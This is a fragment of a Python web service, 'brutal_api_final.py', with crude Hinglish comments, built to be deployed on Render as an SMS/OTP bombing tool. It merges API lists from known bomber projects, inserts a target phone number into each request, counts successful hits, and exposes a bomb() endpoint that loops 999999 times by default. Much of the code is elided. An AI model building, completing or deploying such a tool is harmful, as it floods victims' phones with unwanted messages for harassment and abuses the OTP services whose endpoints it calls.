# ============================================
# brutal_api_final.py
# BENCHOD — RENDER PE DEPLOY KARNE WALA FINAL VERSION
# ============================================
...
# ====== SAB MERGE ======
ALL_APIS = TERI_APIS + JBOMBER_APIS + TBOMB_APIS + CONFIG_APIS + MY_APIS
        ...
        try:
            ...
            if api.get("type") == "external":
                ...
                for key, value in params.items():
                    if value is None:
                        if "num" in key or "phone" in key:
                            params[key] = self.number
                resp = self.session.get(api["url"], params=params, timeout=5)
                if resp.status_code == 200:
                    data = resp.json()
                    success_count = data.get("successful", 1)
                    with success_lock:
...
def bomb():
    ...
    if request.method == 'GET':
        ...
        cycles = int(request.args.get('cycles', 999999))  # Infinite by default
